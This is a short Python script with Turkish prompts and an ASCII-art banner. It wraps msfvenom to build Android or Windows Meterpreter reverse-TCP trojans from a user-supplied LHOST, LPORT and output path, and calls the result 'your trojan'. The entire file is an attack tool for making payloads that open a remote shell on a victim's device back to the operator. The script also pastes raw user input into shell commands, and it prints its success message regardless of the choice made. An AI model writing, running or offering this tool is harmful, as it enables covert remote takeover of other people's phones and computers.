import os

os.system("clear")

print("""\u001b[31m ##::::'##::::'###::::'##::: ##:'########:'########:::::'###::::'##::: ##:
 ##:::: ##:::'## ##::: ###:: ##: ##.....:: ##.... ##:::'## ##::: ###:: ##:
 ##:::: ##::'##:. ##:: ####: ##: ##::::::: ##:::: ##::'##:. ##:: ####: ##:
 #########:'##:::. ##: ## ## ##: ######::: ##:::: ##:'##:::. ##: ## ## ##:
 ##.... ##: #########: ##. ####: ##...:::: ##:::: ##: #########: ##. ####:
 ##:::: ##: ##.... ##: ##:. ###: ##::::::: ##:::: ##: ##.... ##: ##:. ###:
 ##:::: ##: ##:::: ##: ##::. ##: ########: ########:: ##:::: ##: ##::. ##:
..:::::..::..:::::..::..::::..::........::........:::..:::::..::..::::..::
:::::::::'####::::'########:::'#######:::'#######::'########:
:::::::::. ##::::: ##.... ##:'##.... ##:'##.... ##:... ##..::
:::::::::: ##::::: ##:::: ##: ##:::: ##: ##:::: ##:::: ##::::
'#######:: ##::::: ########:: ##:::: ##: ##:::: ##:::: ##::::
........:: ##::::: ##.. ##::: ##:::: ##: ##:::: ##:::: ##::::
:::::::::: ##::::: ##::. ##:: ##:::: ##: ##:::: ##:::: ##::::
:::::::::'####:::: ##:::. ##:. #######::. #######::::: ##::::
:::::::::....:::::..:::::..:::.......::::.......::::::..:::::   By ./S778
""")

print("\u001b[32mBU TOOLU KULLANABİLMENİZ İÇİN METASPLOİT YÜKLÜ OLMASI LAZIM!")

print("""Hedef Cihazın Platformunu Giriniz.

1)Android
2)Windows
""")

secenek=input("Işlemi Giriniz > ")

if(secenek=="1"):
	lhost=input("LHOST Giriniz > ")
	lport=input("LPORT Giriniz > ")
	nasilkaydedilsin=input("Hangi Dosya Dizinine Kaydedilsin? Ve Trojanın Ismi Örnek ---> /sdcard/trojaninismi.apk > ")
	os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+lhost+" LPORT="+lport+" R > "+nasilkaydedilsin+" ")
print("Trojanınız Başarıyla Oluşturuldu.")
	
if(secenek=="2"):
		winlhost=input("LHOST Giriniz > ")
		winlport=input("LPORT Giriniz > ")
		winnasilkaydedilsin=input("Hangi Dosya Dizinine Kaydedilsin? Ve Trojanın Ismi Örnek ---> root/Desktop/trojaninismi.apk > ")
		os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+winlhost+" LPORT="+winlport+" R > "+winnasilkaydedilsin+" ")
print("Trojanınız Başarıyla Oluşturuldu.")